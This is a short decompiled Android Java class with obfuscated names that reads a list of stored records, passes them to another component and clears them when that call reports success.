package com.app.system.common.f;

import android.content.Context;
import com.app.system.common.d.a.n;
import com.app.system.common.h;
import com.app.system.common.h.m;
import java.util.List;

public class l
  extends a
{
  public static void k(Context paramContext)
  {
    m localm = new m(paramContext);
    List localList = localm.c();
    if ((localList != null) && (localList.size() != 0))
    {
      if ((new n(h.c(paramContext)).a(paramContext, localList) == 1) && (localm.a(localList))) {
        localm.e();
      }
      return;
    }
  }
}


/* Location:              ~/com/app/system/common/f/l.class
 *
 * Reversed by:           J
 */